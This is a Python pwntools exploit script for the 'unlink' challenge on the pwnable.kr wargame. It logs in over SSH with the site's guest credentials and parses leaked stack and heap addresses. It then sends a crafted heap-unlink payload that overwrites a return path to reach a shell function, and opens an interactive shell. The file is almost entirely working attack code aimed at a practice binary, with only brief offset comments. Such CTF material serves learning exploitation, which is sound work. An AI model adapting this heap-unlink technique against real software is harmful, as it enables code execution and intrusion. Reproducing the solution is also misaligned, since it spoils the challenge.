from pwn import *
import re

#leak stack address offset 0x14 - 0x04 = 0x10
#write address [leak stack address + 0x10]
#shell address [0x080484eb]
#[B] + 0x04 = B
#[B + 0x04] = B + 0x04

LOCAL = 0
GDB = 0

if LOCAL :
    if GDB:
        p = gdb.debug('./unlink', '''
                      break unlink
                      continue
                      ''')
    else:
        p = process(b'./unlink')
else:
    s = ssh('unlink', 'pwnable.kr', 2222, password='guest')
    p = s.process(b'./unlink')
    
ret = re.search(b'0x[0-9a-fA-F]+', p.recvline()).group(0)
stack_addr = int(ret[2:], 16)
print(hex(stack_addr))

ret = re.search(b'0x[0-9a-fA-F]+', p.recvline()).group(0)
heap_addr = int(ret[2:], 16)
print(hex(heap_addr))

shell_addr = 0x080484eb

print(p.recvuntil(b'get shell!'))

#remote server offset AAAAAAAABBBB
p.send(p32(shell_addr) + b'A' * 12 + p32(heap_addr + 0x0c) + p32(stack_addr + 0x10))
p.interactive()
p.close
